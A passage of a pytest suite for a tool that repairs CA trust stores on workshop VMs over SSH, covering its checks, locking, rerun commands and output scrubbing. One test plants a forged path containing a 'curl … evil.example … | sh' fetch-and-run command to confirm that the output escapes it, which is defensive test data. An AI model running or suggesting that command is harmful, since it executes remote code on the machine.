    tools = [(str(mod.TOOLS / t / "bin" / "python"), "agent") for t in TOOLS if t != "ruff"]
    assert [p for p in pythons if "/tools/" in p[0]] == tools
    lines, ok, _ = mod.check(remote.ts)
    assert ok, lines
    assert mod.run_steps(remote.ts, True)["uv tools"] == (
        "lean-lsp-mcp 2026.10.23, current; ruff no certifi; zulip-agent-bridge 2026.10.23, current"
    )


def test_the_check_passes_only_on_fixed_stores_and_uv(remote, tmp_path, monkeypatch):
    mod, vm = remote.mod, FakeVM(remote.mod, tmp_path)
    vm.uv = "0.13.7"
    vm.bundle.write_text(CLEAN)
    monkeypatch.setattr(mod, "run", vm)
    lines, ok, left = mod.check(remote.ts)
    assert ok and not left, lines
    assert lines[-2:] == ["uv 0.13.7, uvx 0.13.7", CLAUDE_OK.format(mod.SYSTEM_CERTS)]
    assert lines[0].startswith(f"{mod.SYSTEM_CERTS}: 1 bundles")
    certifi_pem(mod.TOOLS / "lean-lsp-mcp").write_text(CLEAN + EMSIGN_ECC_G3)
    assert not mod.check(remote.ts)[1]
    certifi_pem(mod.TOOLS / "lean-lsp-mcp").write_text(CLEAN)
    vm.uvx = "0.13.3"  # uv new, uvx old (review round 1, N8)
    assert not mod.check(remote.ts)[1]
    vm.uv = vm.uvx = "0.13.3"
    assert not mod.check(remote.ts)[1]


def test_what_agents_installed_is_left_and_named(remote, tmp_path, monkeypatch):
    """Review round 1 on #856, B2: the check reads more than the steps fix. A pip an agent
    installed in ~/venv or a uv tool, and a uv-managed CPython, are left: named, with their
    environment, and they don't fail the check; conda's pip is step 4's, so it isn't left."""
    mod, vm = remote.mod, FakeVM(remote.mod, tmp_path)
    vm.uv = "0.13.7"
    vm.bundle.write_text(CLEAN)
    monkeypatch.setattr(mod, "run", vm)
    pip = mod.HOME / "venv" / "lib" / "python3.12" / "site-packages" / "pip" / "_vendor" / "certifi"
    cpython = mod.PYTHONS / "cpython-3.12.13-linux-x86_64-gnu" / "lib" / "python3.12"
    cpython = cpython / "site-packages" / "pip" / "_vendor" / "certifi"
    for path in (pip, cpython):
        path.mkdir(parents=True)
        (path / "cacert.pem").write_text(CLEAN + EMSIGN_ECC_G3)
    # round 2, N1: a package's own bundle that an agent installed (grpcio's) is left as well
    grpc = mod.HOME / "venv" / "lib" / "python3.12" / "site-packages" / "grpc" / "_cython"
    grpc.mkdir(parents=True)
    (grpc / "roots.pem").write_text(CLEAN + EMSIGN_ECC_G3)
    lines, ok, left = mod.check(remote.ts)
    assert ok, lines
    assert left == [
        {"kind": "other", "file": str(grpc / "roots.pem")},
        {"kind": "pip", "file": str(pip / "cacert.pem"), "env": str(mod.HOME / "venv")},
        {"kind": "python", "file": str(cpython / "cacert.pem")},
    ]
    conda_pip = mod.CONDA / "lib" / "python3.12" / "site-packages" / "pip" / "_vendor" / "certifi"
    conda_pip.mkdir(parents=True)
    (conda_pip / "cacert.pem").write_text(CLEAN + EMSIGN_ECC_G3)
    vm.bundle = conda_pip / "cacert.pem"  # what conda's pip returns
    lines, ok, left = mod.check(remote.ts)
    assert not ok and len(left) == 3  # conda's pip is step 4's: it fails the check
    certifi_pem(mod.HOME / "venv").write_text(CLEAN + EMSIGN_ECC_G3)  # step 3's: never left
    assert str(certifi_pem(mod.HOME / "venv")) not in str(mod.check(remote.ts)[2])


def test_an_emptied_uv_python_directory_isnt_read(remote, tmp_path, monkeypatch):
    """Review round 2 on #856, N1: after `uv python uninstall`, ~/.local/share/uv/python can hold
    only uv's dot files, which would read NO BUNDLE: it is read only with a CPython in it."""
    mod, vm = remote.mod, FakeVM(remote.mod, tmp_path)
    vm.uv = "0.13.7"
    vm.bundle.write_text(CLEAN)
    monkeypatch.setattr(mod, "run", vm)
    (mod.PYTHONS / ".cache").mkdir(parents=True)
    (mod.PYTHONS / ".lock").touch()
    lines, ok, _ = mod.check(remote.ts)
    assert ok and not [x for x in lines if str(mod.PYTHONS) in x], lines


def test_upgrade_left_pips_goes_through_a_new_uv_only(remote, tmp_path, monkeypatch, capsys):
    """Review round 2 on #856: --upgrade-left-pips upgrades each pip left in ~/venv or a uv tool,
    as agent, by fixed argument lists with this VM's own paths; through uv only once uv and uvx
    lack the root (B2); and the report says whether they do (`uv_ok`)."""
    mod, vm = remote.mod, FakeVM(remote.mod, tmp_path)
    monkeypatch.setattr(mod, "run", vm)
    tool = mod.TOOLS / "lean-lsp-mcp"
    left = [
        {"kind": "pip", "env": str(mod.HOME / "venv"), "file": "a"},
        {"kind": "pip", "env": str(tool), "file": "b"},
        {"kind": "pip", "env": str(mod.HOME / "venv"), "file": "c"},  # once per environment
        {"kind": "pip", "env": "/opt/elsewhere", "file": "d"},
        {"kind": "python", "file": "e"},
    ]
    old = mod.step_left_pips(left, uv_ok=False)
    assert old == "blocked, nothing installed: uv 0.13.2 still holds a distrusted root"
    assert not [c for c in vm.calls if "pip>=26.2.2" in c[0]]
    assert mod.step_left_pips(left, uv_ok=True) == (
        "/opt/elsewhere not upgraded: not ~/venv or a uv tool's environment; "
        "lean-lsp-mcp upgraded; venv upgraded"  # by path
    )
    pips = [(c[0], c[1], c[2]) for c in vm.calls if c[0][-1] == "pip>=26.2.2"]
    assert pips == [
        ([str(mod.BIN / "uv"), "pip", "install", "-q", "--python", str(p / "bin" / "python"),
          "pip>=26.2.2"], "agent", {"UV_NO_CONFIG": "1"})
        for p in (tool, mod.HOME / "venv")
    ]  # fmt: skip
    assert mod.step_left_pips([left[-1]], uv_ok=True) == "none"
    source = base64.b64encode(trust_fix.TRUST_STORES.read_bytes()).decode()
    monkeypatch.setattr(mod, "TRUST_STORES", source)
    assert mod.main(["--apply", "--upgrade-left-pips"]) == 0
    report = json.loads(capsys.readouterr().out.splitlines()[-1])
    assert report["steps"]["left pips"] == "none" and report["uv_ok"] is False  # uv 0.13.2
    assert mod.main(["--upgrade-left-pips"]) == 2  # only with --apply


def test_the_driver_sends_trust_stores_in_the_remote_half():
    script = trust_fix.remote_script()
    compile(script, "trust_fix_remote.py", "exec")
    (line,) = [x for x in script.splitlines() if x.startswith("TRUST_STORES = ")]
    assert base64.b64decode(line.split('"')[1]) == trust_fix.TRUST_STORES.read_bytes()
    assert trust_fix.PLACEHOLDER not in script
    # and apt_repair.py, which step 1 runs before its apt-get update (#947)
    (line,) = [x for x in script.splitlines() if x.startswith("APT_REPAIR = ")]
    assert base64.b64decode(line.split('"')[1]) == trust_fix.APT_REPAIR.read_bytes()
    assert trust_fix.APT_PLACEHOLDER not in script


def test_a_remote_half_without_a_placeholder_is_refused(tmp_path, monkeypatch):
    remote = tmp_path / "trust_fix_remote.py"
    remote.write_text(trust_fix.REMOTE.read_text().replace(trust_fix.APT_PLACEHOLDER, ""))
    monkeypatch.setattr(trust_fix, "REMOTE", remote)
    with pytest.raises(ValueError, match="its APT_REPAIR placeholder is missing"):
        trust_fix.remote_script()
    twice = trust_fix.REMOTE.read_text()  # #957's review, N1: exactly once
    remote.write_text(twice.replace(trust_fix.PLACEHOLDER, trust_fix.PLACEHOLDER * 2))
    with pytest.raises(ValueError, match="its TRUST_STORES placeholder is there 2 times"):
        trust_fix.remote_script()


class Runner:
    """SSH to the fake VMs: REPORT from each, but none from a host in DOWN (not reached) or, with
    REPORT None, a cut connection, or STDERR and exit 1 (a remote half that raised)."""

    def __init__(self, report, *, probe_ok=True, down=(), stderr="", drop=()):
        self.calls, self.report, self.probe_ok, self.down = [], report, probe_ok, set(down)
        self.stderr, self.drop = stderr, set(drop)  # DROP: hosts whose run's connection drops

    def __call__(self, argv, *, timeout_s=120.0, env=None, stdin=None):
        assert argv[0] == "ssh" and "StrictHostKeyChecking=yes" in argv
        self.calls.append((argv[-1], stdin))
        host = argv[argv.index("--") - 1].removeprefix("ubuntu@")
        if host in self.down or (argv[-1] == PROBE and not self.probe_ok):
            return RunResult(255, "", f"ssh: connect to host {host} port 22: timed out")
        if argv[-1].startswith(trust_fix.REMOTE_CMD) and host in self.drop:
            return RunResult(255, "", f"Connection to {host} closed by remote host.")
        if argv[-1].startswith(trust_fix.REMOTE_CMD) and self.report is None and self.stderr:
            return RunResult(1, "", self.stderr)
        if argv[-1].startswith(trust_fix.REMOTE_CMD) and self.report is None:  # cut
            return RunResult(-1, "", f"timed out after {timeout_s:g} s: ssh")
        if argv[-1].startswith(trust_fix.REMOTE_CMD):
            return RunResult(0, "apt's noise\n" + json.dumps(self.report) + "\n", "")
        return RunResult(0, "", "")


ROW = {"slug": "alice", "ip": "198.51.100.7"}
REPORT = {"apply": True, "steps": {"uv": "0.13.2 -> 0.13.7"}, "check": ["uv 0.13.7"], "ok": True}


def test_a_dry_run_is_one_connection_and_an_apply_holds_off_idle_stop():
    run = Runner(REPORT)
    got = trust_fix.fix_vm(ROW, run, apply=False, script="S", known_hosts="kh")
    assert run.calls == [(trust_fix.REMOTE_CMD, "S")]
    assert got.row()[:3] == ["alice", "198.51.100.7", "-"] and got.row()[-1] == "ok"
    run = Runner(REPORT)
    got = trust_fix.fix_vm(ROW, run, apply=True, script="S", known_hosts="kh")
    sent = [PROBE, trust_fix.REMOTE_CMD + " --apply"]  # no hold: the remote half's (round 5)
    assert [c[0] for c in run.calls] == sent
    assert got.row()[3] == "0.13.2 -> 0.13.7" and got.passed(True)


def test_rows_not_reached_failed_or_without_a_vm():
    run = Runner(REPORT, probe_ok=False)
    got = trust_fix.fix_vm(ROW, run, apply=True, script="S", known_hosts="kh")
    assert len(run.calls) == 1 and not got.passed(True)
    assert got.row()[-1].startswith("not reached: ssh: connect to host")
    bare = trust_fix.fix_vm({"slug": "bob"}, Runner(REPORT), apply=True, script="", known_hosts="")
    assert bare.skipped and bare.passed(True)
    bad = trust_fix.fix_vm(ROW, Runner({**REPORT, "ok": False}), apply=True, script="S",
                           known_hosts="kh")  # fmt: skip
    assert bad.row()[-1] == "FAILED" and not bad.passed(True) and bad.passed(False)
    run = Runner(None)  # the run's connection cut: it may still run there, so the hold stays
    cut = trust_fix.fix_vm(ROW, run, apply=True, script="S", known_hosts="kh")
    assert [c[0] for c in run.calls] == [PROBE, trust_fix.REMOTE_CMD + " --apply"]
    assert (
        cut.row()[-1] == "cut after 3000 s, and it may still be running there: timed out"
        " after 3000 s: ssh"
    )
    assert cut.cut and not cut.passed(True)
    assert trust_fix.TIMEOUT_S < 3600  # inside the idle-stop hold's hour (review round 1, N6)
    raised = "Traceback (most recent call last):\n  File …\nOSError: [Errno 5] Input/output error"
    run = Runner(None, stderr=raised)  # the remote half raised: its exception is the row's cause
    got = trust_fix.fix_vm(ROW, run, apply=True, script="S", known_hosts="kh")
    assert got.row()[-1] == "no report: OSError: [Errno 5] Input/output error"
    assert IDLE_HOLD_OFF_CMD not in [c[0] for c in run.calls]  # this side never touches the hold


def test_main_prints_a_row_per_vm_and_fails_a_failed_check(tmp_path, monkeypatch, capsys):
    roster = tmp_path / "roster.csv"
    roster.write_text("slug,email,ip\nalice,a@example.org,198.51.100.7\nbob,b@example.org,\n")
    report = {**REPORT, "ok": False, "check": ["x: 1 bundles", "  DISTRUSTED emSign …: /x"]}
    monkeypatch.setattr(trust_fix, "subprocess_runner", Runner(report))
    assert trust_fix.main(["--roster", str(roster), "--apply", "--known-hosts", "kh"]) == 1
    out = capsys.readouterr().out
    assert "\nalice        198.51.100.7  " in out and "\nalice:\n  DISTRUSTED emSign …: /x\n" in out
    assert "\n0 VM(s) fixed and checked; not done: alice; 1 row(s) without a VM\n" in out


def test_a_blocked_step_gets_the_exact_rerun_command(tmp_path, monkeypatch, capsys):
    """Codex round 1 on #856: the deployer is told to rerun the VMs whose steps were blocked or
    failed, and (review round 1, N5) those not reached, with this run's own command, `sudo -u`
    included when sudo ran it."""
    roster = tmp_path / "roster.csv"
    roster.write_text(
        "slug,email,ip\nalice,a@example.org,198.51.100.7\ncarol,c@example.org,198.51.100.9\n"
    )
    steps = {"ca-certificates": "FAILED: apt-get update: E: Could not get lock …"}
    steps["uv"] = "blocked, nothing installed: /etc/ssl/certs still holds a distrusted root"
    run = Runner({**REPORT, "steps": steps}, down={"198.51.100.9"})  # carol: stopped since
    monkeypatch.setattr(trust_fix, "subprocess_runner", run)
    monkeypatch.setenv("SUDO_USER", "deployer")
    monkeypatch.setattr(sys, "argv", ["/srv/trust_fix.py"])  # the script, as the command named it
    assert trust_fix.main(["--roster", str(roster), "--apply", "--known-hosts", "kh"]) == 1
    out = capsys.readouterr().out
    me = pwd.getpwuid(os.getuid()).pw_name
    command = shlex.join([
        "sudo", "-u", me, sys.executable, "-E", "-s", "/srv/trust_fix.py", "--roster", str(roster),
        "--known-hosts", "kh", "--only", "alice", "--only", "carol", "--apply",
    ])  # fmt: skip
    assert out.endswith(f"rerun them:\n  {command}\n"), out
    assert "\nNot done on alice, carol: `!start` a VM not reached; wait out apt's lock" in out
    monkeypatch.delenv("SUDO_USER")
    trust_fix.main(["--roster", str(roster), "--apply", "--known-hosts", "kh"])
    assert capsys.readouterr().out.endswith(f"\n  {command.split(' ', 3)[3]}\n")


VENV = "/home/agent/venv"
LEFT = [
    {"kind": "pip", "env": VENV, "file": f"{VENV}/lib/python3.12/site-packages/pip/x.pem"},
    {"kind": "python", "file": "/home/agent/.local/share/uv/python/cpython-3.12/x.pem"},
    {"kind": "other", "file": f"{VENV}/lib/python3.12/site-packages/grpc/_cython/roots.pem"},
]


def run_main(tmp_path, monkeypatch, capsys, report, *args):
    roster = tmp_path / "roster.csv"
    roster.write_text("slug,email,ip\nalice,a@example.org,198.51.100.7\n")
    monkeypatch.setattr(trust_fix, "subprocess_runner", Runner(report))
    monkeypatch.setattr(sys, "argv", ["/srv/trust_fix.py"])
    monkeypatch.delenv("SUDO_USER", raising=False)
    code = trust_fix.main(["--roster", str(roster), "--known-hosts", "kh", *args])
    return code, capsys.readouterr().out, roster


def test_what_is_left_is_named_and_its_pips_offered_only_through_a_new_uv(
    tmp_path, monkeypatch, capsys
):
    """Review round 1 on #856, B2: the check passes but for what agents installed, which the row
    says and the summary names. Round 2: the pips are offered as this script's own
    --upgrade-left-pips, never as a command with the VM's paths in it (B1), and only where the
    VM's uv and uvx lack the root (B2). N3: VM text is redacted."""
    steps = {"conda": "FAILED: base: CondaHTTPError: https://conda.anaconda.org/t/ab-12345-cd/x"}
    report = {**REPORT, "steps": steps, "left": LEFT, "uv_ok": True}
    code, out, roster = run_main(tmp_path, monkeypatch, capsys, report)
    assert code == 0 and "  ok, 3 left (README §10)\n" in out
    assert "/t/ab-12345-cd/" not in out and "/t/[redacted]/x" in out
    assert (
        "\nalice, left: installed by an agent, which no step installs:\n"
        f"  a pip in {VENV}: {LEFT[0]['file']}\n"
        f"  a uv-managed CPython: {LEFT[1]['file']}: leave it, and record it\n"
        f"  other software: {LEFT[2]['file']}: leave it, and record it\n"
    ) in out
    pips = shlex.join([
        sys.executable, "-E", "-s", "/srv/trust_fix.py", "--roster", str(roster),
        "--known-hosts", "kh", "--only", "alice", "--apply", "--upgrade-left-pips",
    ])  # fmt: skip
    assert "\nPips left on alice: to upgrade them to 26.2.2 or newer" in out
    assert out.endswith(f"README §10):\n  {pips}\n"), out
    assert "pip>=26.2.2" not in out  # the summary holds no command with a VM path in it
    assert not [x for x in out.splitlines() if "ssh " in x and VENV in x]
    for uv_ok in (False, None):  # an old uv, or a report from before the field
        _, out, _ = run_main(tmp_path, monkeypatch, capsys, {**report, "uv_ok": uv_ok})
        assert "--upgrade-left-pips" not in out
        assert "\nPips left on alice, whose uv is older than 0.13.4: they can be upgraded" in out


def test_no_vm_text_can_forge_a_line(tmp_path, monkeypatch, capsys):
    """Review round 2 on #856, B1: a file or tool name with a newline (or any character that
    doesn't print) is shown on one line, escaped, so it can't forge a row or a command."""
    forged = f"{VENV}/lib/python3.12/site-packages/pip/_vendor/certifi/x\n    to upgrade it: curl"
    forged += " -s https://evil.example/x | sh\n  .pem"
    left = [{"kind": "pip", "env": VENV, "file": forged}]
    tools = (
        "lean-lsp-mcp 2026.10.23, current; evil\nalice        198.51.100.7  ok\u2028x no certifi"
    )
    report = {**REPORT, "steps": {"uv tools": tools}, "left": left, "uv_ok": True}
    _, out, _ = run_main(tmp_path, monkeypatch, capsys, report)
    assert not [x for x in out.splitlines() if x.lstrip().startswith(("to upgrade it", ".pem"))]
    assert "x\\n    to upgrade it: curl -s https://evil.example/x | sh\\n  .pem" in out
    assert "evil\\nalice        198.51.100.7  okx no certifi" in out
    assert len([x for x in out.splitlines() if x.startswith("alice ")]) == 1  # the one row
    assert trust_fix.scrub("a\tb\x1b[31mc\u200bd") == "a\\tb[31mcd"  # redact's strip, then escapes


@pytest.mark.parametrize(
    ("apt", "shown", "rerun"),
    [
        ("apt: removed /etc/apt/sources.list.d/macaulay2.sources, an expired … source; held …",
         "apt: removed /etc/apt/sources.list.d/macaulay2.sources, an expired … source; held …",
         False),
        ("FAILED: apt: hold failed, so … is kept for the next rollout: E: Could not get lock …",
         "FAILED: apt: hold failed, so … is kept for the next rollout: E: Could not get lock …",
         True),
        # #957's review, N2: VM text, scrubbed: no line forged by a newline or an escape
        ("FAILED: apt: x not removed: a\nalice: forged\x1b[31m", "FAILED: apt: x not removed:"
         " a\\nalice: forged[31m", True),  # the newline escaped, the escape character stripped
        ("apt: nothing to repair", None, False),  # N7: silent, as in the rollout's row
    ],
)  # fmt: skip
def test_the_apt_source_is_said_under_the_table(tmp_path, monkeypatch, capsys, apt, shown, rerun):
    """#947: the repair's line, under the table, scrubbed; one that failed asks for a rerun."""
    steps = {"apt source": apt, "ca-certificates": "20240203 -> 20260816ubuntu0.24.04.1"}
    _, out, _ = run_main(tmp_path, monkeypatch, capsys, {**REPORT, "steps": steps}, "--apply")
    head = "\nalice: the apt source, before ca-certificates' apt-get update:\n"
    assert (f"{head}  {shown}\n" in out) if shown else (head not in out), out
    assert "\nalice: forged" not in out
    assert ("\nNot done on alice:" in out) is rerun
    assert "apt source" not in out.splitlines()[0]  # not a column of the table


def test_a_run_that_ended_badly_gets_the_commands_that_look_into_it(tmp_path, monkeypatch, capsys):
    """Review round 2 on #856, B3: what still runs there, then dpkg's repair after an apt killed
    mid-install, and conda's transactions after it failed: pinned-SSH commands, fixed literals
    with the roster's address and conda's fixed prefixes."""
    steps = {
        "ca-certificates": "FAILED: apt-get install killed after 900 s, maybe mid-install: …",
        "conda": "base updated; FAILED: sage: CondaError: …",
    }
    _, out, _ = run_main(tmp_path, monkeypatch, capsys, {**REPORT, "steps": steps}, "--apply")

    def ssh(remote):
        return shlex.join(trust_fix.ssh_argv("198.51.100.7", remote, known_hosts="kh"))

    sage = "/home/agent/miniforge/envs/sage"
    back = "sudo -u agent -H env CONDA_SSL_VERIFY=/etc/ssl/certs/ca-certificates.crt"
    back += f" /home/agent/miniforge/bin/conda install -y --revision N -p {sage}"  # round 3, N5
    look = [
        "\nalice: to see what still runs there, until it reads `none running`:",
        f"  {ssh(trust_fix.LOOK_CMD)}",
        "  one of them that never ends, by its PID from that list, then the dry run:",
        f"  {ssh('sudo kill PID')}",  # review round 3, N2
    ]
    assert (
        "\n".join(look) + "\n"
        "  then, as dpkg may be left half-configured:\n"
        f"  {ssh('sudo dpkg --configure -a')}\n"
        "  then conda's sage transactions, the last one this run's:\n"
        f"  {ssh(trust_fix.CONDA_LIST.format(sage))}\n"
        "  if it broke the environment, back to the one before it, N from that list:\n"
        f"  {ssh(back)}\n"
    ) in out
    assert "--revisions -p /home/agent/miniforge\n" not in out  # base didn't fail
    # the look matches neither itself nor its shell: the brackets keep each pattern from its text
    pattern = (
        r"/usr/bin/python3 -I -|conda install|apt-get|dpkg |uv pip install|apt_repair\.py|apt-mark "
    )
    assert not re.search(pattern, trust_fix.LOOK_CMD)
    run = Runner(None)  # cut: the look only
    got = trust_fix.fix_vm(ROW, run, apply=True, script="S", known_hosts="kh")
    assert trust_fix.recovery(got, SimpleNamespace(known_hosts="kh")) == look


def test_managed_settings_left_alone_get_the_look_and_the_images_file(
    remote, tmp_path, monkeypatch, capsys
):
    """#882: step 5's refusal, as the remote half words it, gets the pinned-SSH look at the file
    and the command that puts the image's in its place, every key build.sh writes; and a rerun."""
    mod = remote.mod
    monkeypatch.setattr(mod, "MANAGED", Path(trust_fix.MANAGED))  # the words, not the file
    monkeypatch.setattr(mod, "managed_settings", lambda: json.loads("{"))
    refused = mod.step_claude(True)
    steps = {**REPORT["steps"], "claude store": refused}
    _, out, _ = run_main(tmp_path, monkeypatch, capsys, {**REPORT, "steps": steps}, "--apply")

    def ssh(remote):
        return shlex.join(trust_fix.ssh_argv("198.51.100.7", remote, known_hosts="kh"))

    assert (
        "\nalice: Claude Code's managed settings, which step 5 left as they are:\n"
        f"  {ssh('sudo cat /etc/claude-code/managed-settings.json')}\n"
        "  once you know what the file held, the image's in its place, then the dry run:\n"
        f"  {ssh(trust_fix.MANAGED_PUT)}\n"
    ) in out
    assert "Not done on alice" in out  # in the rerun, once the file is fixed
    put = trust_fix.MANAGED_PUT
    assert put.endswith("| sudo install -m 0644 /dev/stdin /etc/claude-code/managed-settings.json")
    snippet = (ROOT / "workshop" / "ami" / "build.sh").read_text()
    snippet = snippet.split("managed-settings.json <<'PY'\n", 1)[1].split("\nPY\n", 1)[0]
    fresh = tmp_path / "fresh.json"
    subprocess.run([sys.executable, "-c", snippet, str(fresh)], check=True)  # noqa: S603
    assert json.loads(trust_fix.MANAGED_IMAGE) == json.loads(fresh.read_text())


@pytest.mark.parametrize("cell", ["absent: would set system", "absent -> system"])
def test_absent_managed_settings_get_the_images_file(tmp_path, monkeypatch, capsys, cell):
    """Review round 1 on #885, N5: where there was no file, step 5's holds its key alone, so the
    driver prints the command that puts the image's file, every key, in its place."""
    steps = {**REPORT["steps"], "claude store": cell}
    _, out, _ = run_main(tmp_path, monkeypatch, capsys, {**REPORT, "steps": steps}, "--apply")
    put = shlex.join(trust_fix.ssh_argv("198.51.100.7", trust_fix.MANAGED_PUT, known_hosts="kh"))
    assert (
        "\nalice: Claude Code's managed settings were missing, and with them\n"
        "  the image's other keys: the image's file in its place, then the dry run:\n"
        f"  {put}\n"
    ) in out
    assert trust_fix.MANAGED_LOOK not in out


def test_the_looks_first_line_is_none_running_only_with_nothing_running(tmp_path):
    """Review round 3 on #856, N1: the look reads `none running` only when no run holds the lock
    and none of the remote half, apt, dpkg, conda or `uv pip install` runs, since a run killed can
    leave a child going; else what runs, with its PID. Run here as is, but for sudo, LOCK and
    PROCS's patterns: one only this test's process has, since a test beside it may run uv."""
    # PROCS's own patterns, through grep -E: the remote half with or without its arguments and
    # what it runs, but neither the look's text (the shell running it) nor other processes
    pattern = re.search(r"grep -E '([^']+)'", trust_fix.PROCS).group(1)
    lines = [
        "sudo /usr/bin/python3 -I - --apply", "/usr/bin/python3 -I - --apply --upgrade-left-pips",
        "/usr/bin/python3 -I -", "/home/agent/miniforge/bin/conda install -y -q -p /x",
        "apt-get -q -y install --only-upgrade ca-certificates", "/usr/bin/dpkg --configure -a",
        "/home/agent/.local/bin/uv pip install -q --python /x",
        "/usr/bin/python3 -I /tmp/zab-trust-fix.x1/apt_repair.py",  # #957's review, N3
        "/usr/bin/apt-mark hold macaulay2 gfan", "/usr/bin/python3 -I -c x",
        "sleep 30", f"bash -c {trust_fix.LOOK_CMD}", "apt_repairXpy",
    ]  # fmt: skip
    argv = ["grep", "-E", pattern]
    grep = subprocess.run(argv, input="\n".join(lines) + "\n", capture_output=True, text=True)  # noqa: S603
    assert grep.stdout.splitlines() == lines[:9]
    lock = tmp_path / "trust-fix.lock"
    marker = f"zab-look-test-{os.getpid()}"
    procs = f"ps -eo pid,etime,args | grep -E '[{marker[0]}]{marker[1:]}'"
    assert trust_fix.PROCS in trust_fix.LOOK_CMD
    look = trust_fix.LOOK_CMD.replace("sudo flock", "flock").replace(trust_fix.LOCK, str(lock))
    look = look.replace(trust_fix.PROCS, procs)

    def first_line():
        done = subprocess.run(["bash", "-c", look], capture_output=True, text=True, check=True)  # noqa: S603, S607
        return done.stdout.splitlines()

    assert first_line() == ["none running"]
    child = subprocess.Popen(["bash", "-c", f'exec -a "{marker} x" sleep 30'])  # noqa: S603, S607
    try:
        time.sleep(0.2)
        out = first_line()
        assert out[0] == "no repair holds the lock, but these still run:"
        assert any(x.lstrip().startswith(f"{child.pid} ") and f"{marker} x" in x for x in out)
        holder = subprocess.Popen(["flock", str(lock), "sleep", "30"])  # noqa: S603, S607
        try:
            time.sleep(0.2)
            assert first_line()[0] == "a repair is still running here (its lock is held)"
        finally:
            holder.kill()
            holder.wait()
    finally:
        child.kill()
        child.wait()


def test_a_failed_check_doesnt_list_whats_left_twice():
    """Review round 2 on #856, N2: a left file is in its own list, not also among the failures."""
    check = ["x: 2 bundles", "  DISTRUSTED emSign ECC Root CA - G3: /etc/ssl/certs/a.pem"]
    check.append(f"  DISTRUSTED emSign ECC Root CA - G3: {LEFT[0]['file']}")
    got = trust_fix.FixResult("alice", "198.51.100.7", {"ok": False, "check": check, "left": LEFT})
    out = trust_fix.summary(got, SimpleNamespace(known_hosts="kh"))
    assert out[:2] == ["\nalice:", "  DISTRUSTED emSign ECC Root CA - G3: /etc/ssl/certs/a.pem"]
    assert sum(LEFT[0]["file"] in x for x in out) == 1


def test_a_connection_lost_after_the_hold_may_still_be_running(tmp_path, monkeypatch, capsys):
    """Codex round 3 on #856: ssh exits 255 when an established connection drops. After the
    hold's connection worked, the run may have begun and still be going: it is cut, with the
    command that looks into it, and never in a rerun beside itself, only its dry run once the
    look reads `none running`. A 255 before anything began (the hold's) stays `not reached`, and
    so does a dry run's, which changes nothing."""
    run = Runner(REPORT, drop={"198.51.100.7"})
    got = trust_fix.fix_vm(ROW, run, apply=True, script="S", known_hosts="kh")
    assert [c[0] for c in run.calls] == [PROBE, trust_fix.REMOTE_CMD + " --apply"]
    assert got.cut and not got.passed(True)  # the hold is left to lapse: it may still run there
    assert got.row()[-1] == (
        "connection lost after the run began, and it may still be running there: Connection to"
        " 198.51.100.7 closed by remote host."
    )
    look = shlex.join(trust_fix.ssh_argv("198.51.100.7", trust_fix.LOOK_CMD, known_hosts="kh"))
    assert trust_fix.recovery(got, SimpleNamespace(known_hosts="kh"))[1] == f"  {look}"
    dry = trust_fix.fix_vm(ROW, Runner(REPORT, drop={"198.51.100.7"}), apply=False, script="S",
                           known_hosts="kh")  # fmt: skip
    assert not dry.cut and dry.row()[-1].startswith("not reached: Connection to 198.51.100.7")

    def killed(argv, *, timeout_s=120.0, env=None, stdin=None):  # the local ssh killed
        return RunResult(-15 if argv[-1].startswith(trust_fix.REMOTE_CMD) else 0, "", "")

    got = trust_fix.fix_vm(ROW, killed, apply=True, script="S", known_hosts="kh")
    assert got.cut and got.row()[-1] == (
        "connection lost after the run began, and it may still be running there: ssh exit -15"
    )
    early = trust_fix.fix_vm(ROW, Runner(REPORT, probe_ok=False), apply=True, script="S",
                             known_hosts="kh")  # fmt: skip
    assert not early.cut and early.row()[-1].startswith("not reached: ssh: connect to host")
    roster = tmp_path / "roster.csv"
    roster.write_text(
        "slug,email,ip\nalice,a@example.org,198.51.100.7\ncarol,c@example.org,198.51.100.9\n"
    )
    blocked = {"uv": "blocked, nothing installed: /etc/ssl/certs still holds a distrusted root"}
    run = Runner({**REPORT, "steps": blocked}, drop={"198.51.100.7"})
    monkeypatch.setattr(trust_fix, "subprocess_runner", run)
    monkeypatch.setattr(sys, "argv", ["/srv/trust_fix.py"])
    monkeypatch.delenv("SUDO_USER", raising=False)
    assert trust_fix.main(["--roster", str(roster), "--apply", "--known-hosts", "kh"]) == 1
    out = capsys.readouterr().out
    base = [sys.executable, "-E", "-s", "/srv/trust_fix.py", "--roster", str(roster)]
    base += ["--known-hosts", "kh"]
    assert (
        "\nMay still be running on alice: not in any rerun here. Run the first command under its"
        " name above until it reads `none running`, then its dry run:\n"
        f"  {shlex.join([*base, '--only', 'alice'])}\n"
    ) in out
    assert out.endswith(f"rerun them:\n  {shlex.join([*base, '--only', 'carol', '--apply'])}\n")
    assert "--only alice --apply" not in out


#: A run's lifetime, in a process of its own: the remote half loaded from its file, its lock
#: taken; then it sleeps (to be killed), raises, or returns.
HOLDER = """
import importlib.util, sys, time
spec = importlib.util.spec_from_file_location("trust_fix_remote", sys.argv[1])
mod = importlib.util.module_from_spec(spec)
spec.loader.exec_module(mod)
mod.LOCK = sys.argv[2]
assert mod.take_lock() is not None
if sys.argv[4:]:  # and its idle-stop hold, as an --apply's main writes it once it has the lock
    mod.HOLD, mod.HOLDING = sys.argv[4], True
    mod.hold_on()
print("held", flush=True)
if sys.argv[3] == "sleep":
    time.sleep(60)
elif sys.argv[3] == "raise":
    raise RuntimeError("a step that raised past guarded")
"""


def test_one_run_at_a_time_by_the_lock_its_process_holds(tmp_path, monkeypatch, capsys):
    """Codex round 4 on #856: a run holds its lock for as long as its process lives, so a second
    one, an --apply, --upgrade-left-pips or a dry run, refuses at once with `running` and does
    nothing; the lock is gone once the first ends, however: killed, failed or done."""
    mod = trust_fix_remote
    monkeypatch.setattr(mod, "LOCK", str(tmp_path / "trust-fix.lock"))
    monkeypatch.setattr(mod, "HOLD", str(tmp_path / "zab-idle-stop.hold"))
    monkeypatch.setattr(mod, "run_steps", lambda *a: pytest.fail("a refused run did a step"))

    def holder(mode):
        argv = [sys.executable, "-I", "-c", HOLDER, str(trust_fix.REMOTE), mod.LOCK, mode]
        proc = subprocess.Popen(argv, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)  # noqa: S603
        assert proc.stdout.readline() == "held\n"
        return proc

    def free():
        fd = mod.take_lock()
        if fd is not None:
            os.close(fd)
        return fd is not None

    first = holder("sleep")
    for argv in (["--apply"], ["--apply", "--upgrade-left-pips"], []):
        assert mod.main(argv) == 0
        report = json.loads(capsys.readouterr().out.splitlines()[-1])
